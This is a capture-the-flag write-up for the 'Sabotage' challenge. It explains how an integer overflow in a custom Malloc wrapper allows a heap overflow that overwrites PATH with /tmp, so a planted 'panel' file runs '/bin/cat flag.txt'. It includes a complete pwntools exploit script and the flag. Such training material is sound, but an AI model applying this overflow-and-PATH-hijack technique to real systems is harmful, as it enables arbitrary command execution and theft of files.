# Sabotage

## Challenge

We have a binary with custom wrappers functions `Malloc()`, `Calloc()`, and `Free()`.
These are like the standard glibc functions, except they store the size of the buffer along with the buffer itself in each allocation.

```c
int64_t * sym.Malloc(int64_t arg1) {
    int64_t *piVar1;
    ulong var_18h;
    ulong size;
    ulong var_8h;
    
    piVar1 = sym.imp.malloc(arg1 + 8);
    if (piVar1 == NULL) {
        piVar1 = NULL;
    }
    else {
        *piVar1 = arg1;
        piVar1 = piVar1 + 1;
    }
    return piVar1;
}
```

We are given a `quantum_destabilizer()` function.
This sets the `ACCESS` environment variable to "DENIED" if it is not already set.
It also allows us to write a file to `/tmp` with a name and contents of our choosing, however, path traversals are filtered out.

We are given a `enter_command_control()` function.
This sets the `ACCESS` environment variable to "DENIED" if it is not already set.
It then allows us to set the `ACCESS` environment variable to a string of our choosing, for which we specify the buffer size.
Lastly, it runs the `panel` shell command.

There are also the `combat_enemy_destroyer()` and `intercept_c2_communication()` functions.
The former allows us to attack an enemy ship, though we are guaranteed to lose.
The latter allows us to read data from `/dev/urandom`.
Both of these are useless to us.

## Solution

The `Malloc()` wrapper function is vulnerable to an integer overflow.
This will lead to the allocated chunk being much smaller than the size given, which allows us to overflow the heap buffer.
We can use this overflow to overwrite environment variables, as they are stored on the heap after the `putenv()` call in `quantum_destabilizer()`.

The file written to `/tmp` using `quantum_destabilizer()` is executable.
Thus, if we change `PATH` to point at `/tmp` and write a file with the filename `panel`, we can execute arbitrary shell commands.

For example, if we make the contents of the file `/bin/cat flag.txt`, it will print the contents of the flag when executing the `panel` command.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 46.101.30.188 --port 31879 sabotage
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sabotage')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '46.101.30.188'
port = int(args.PORT or 31879)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

io = start()

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Quantum destabilizer mount point: ", b"panel")
io.sendlineafter(b"Quantum destablizer is ready to pass a small armed unit through the enemy's shield:", b"/bin/cat flag.txt")

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"ACCESS code length: ", str(-1 % (2 ** 64)).encode())
io.sendlineafter(b"ACCESS code: ", flat({0x20: b"PATH=/tmp"}))

io.interactive()
```

## Flag

```
HTB{CISA_Advisory_ICSA-21-119-04_better_check_your_mallocs}
```
